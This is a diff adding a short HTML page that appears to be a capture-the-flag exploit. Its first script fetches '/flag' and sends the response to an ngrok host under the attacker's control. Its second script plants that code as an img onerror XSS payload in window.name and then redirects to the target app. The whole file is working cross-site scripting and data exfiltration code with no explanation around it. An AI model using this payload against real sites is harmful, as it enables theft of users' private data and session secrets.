@@ -1,0 +1,18 @@
+<html>
+<script id='payload'>
+    base_addr = 'http://7f0d-2804-14d-5cd0-9fd9-def-e5eb-a371-d855.ngrok.io';
+    fetch('/flag')
+        .then((response) => response.text())
+        .then(
+            (text) => 
+                fetch(base_addr + '/flagleak?data=' + encodeURIComponent(text), {
+                    'mode': 'no-cors'
+                })
+        );
+</script>
+<script id='starter'>
+    payload = document.getElementById('payload').innerHTML;
+    window.name = '<img src="http://any.xngrok.io/img.jpg" onerror="'+payload+'">';
+    window.location.href = 'http://app/?length=';
+</script>
+</html>
